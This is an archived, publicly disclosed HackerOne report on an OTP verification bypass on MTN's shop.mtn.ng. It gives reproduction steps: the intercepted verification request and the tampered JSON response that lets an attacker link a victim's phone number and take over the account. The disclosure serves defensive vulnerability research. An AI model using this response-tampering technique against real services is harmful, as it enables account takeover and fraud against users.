---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/authentication-bypass-using-an-alternate-path-or-channel
  - env/web
  - impact/account-takeover
substate: "resolved"
weakness: "Authentication Bypass Using an Alternate Path or Channel"
enriched: true
body: true
date: 2025-03-04
submitted: 2024-10-07T02:52:17.165Z
bounty_usd: null
votes: 98
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "trev0ck"
source: "https://hackerone.com/reports/2762462"
title: "Ability to Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (ATO)"
---
# Ability to Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (ATO)

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 98 | **Program:** MTN Group | **Disclosed:** 2025-03-04

- Report: [https://hackerone.com/reports/2762462](https://hackerone.com/reports/2762462)
- CWE: Authentication Bypass Using an Alternate Path or Channel
- Submitted: 2024-10-07T02:52:17.165Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
A critical vulnerability was identified in the OTP verification process on the shop.mtn.ng platform, which allows attackers to add and verify mobile numbers that they do not control. By tampering with the OTP verification request, an attacker can link a victim's mobile number to their account. This leads to an Account Takeover (ATO) scenario where the attacker gains full access to the victim's account without owning or controlling the victim's phone number.

## Steps to Reproduce

###  Initiate OTP Request
- Begin the login or registration process on the platform.
- Enter a valid mobile number (MSISDN) and request an OTP.

### Capture OTP Verification Request
- Use a proxy tool like **Burp Suite** or **Caido** to intercept the OTP verification request when submitting the OTP.
- The intercepted request will look like this

```http
POST /mtn_otp/index/verification/ HTTP/2
Host: shop.mtn.ng
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

ajax=1&action=verifyotp&msisdn=██████&otp=███████
```
### Manipulate Server Response

- Upon capturing the request, submit an incorrect OTP to receive the server's response

```json
{
  "status": 400,
  "message": "Invalid OTP",
  "msisdn": "█████████",
  "success": false
}
```

Modify the response in the intercepted traffic to indicate a successful verification

```json
{
  "status": 200,
  "message": "success",
  "msisdn": "██████████",
  "success": true
}
```
This will trick the client into thinking that the OTP was successfully verified, even though the OTP is incorrect.

- The manipulated server response now grants full access to the victim's phone number account. Even though the OTP was incorrect, the altered response bypasses the verification, which could allow the attacker to log in as the target user.

## NOTE I do not own this phone number at all and as you can see it is now linked to my account
████████

# Root Cause

- The application fails to protect against the manipulation of the OTP verification response. The server does not perform integrity checks on the response sent back to the client, allowing attackers to alter it and bypass OTP verification entirely.

## Impact

An attacker can exploit this flaw to hijack user accounts by manipulating the OTP verification response. This allows the attacker to

1. Access personal user information such as names, phone numbers, and email addresses.
2. Modify sensitive account settings like passwords, linked emails, and phone numbers.
3. Perform unauthorized actions such as transactions or purchases.
4. Further escalate the attack to other services connected to the victim's account.

## Timeline

- **Report Filed**
- **2024-10-07** @trev0ck: Hi,

Further to this, this also leads to an IDOR, as now I can see all this transaction history relating to the mobile number I have added to my account. 
{███████}
- **2024-10-15** @h1_analyst_dhaval: Hi ████,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
██████
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Pending Program Review**
- **Changed Scope**
- **2024-10-27** @trev0ck: Hi █████ was just wondering if there is an update on this report? Thanks for being generous with your time.
- **2024-10-28** @h1_analyst_dhaval: Hi ████,

Thanks for reaching out, so far there are no new updates to share but keep an eye on this ticket for any changes. Thank you for your patience!

Kind regards,
███
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
- **2025-04-08** @slydingdong1: Hi @trev0ck ,

Can you please remove the screenshot with the phone numbers.

Regards
- **2025-04-08** @trev0ck: Hi @██████████ how do I do that - it looks like I don't have the ability to?
- **2025-06-04** @slydingdong1: Hi @h1_analyst_dhaval

Can you please assist with taking down the images that contains sensitive information.

Regards
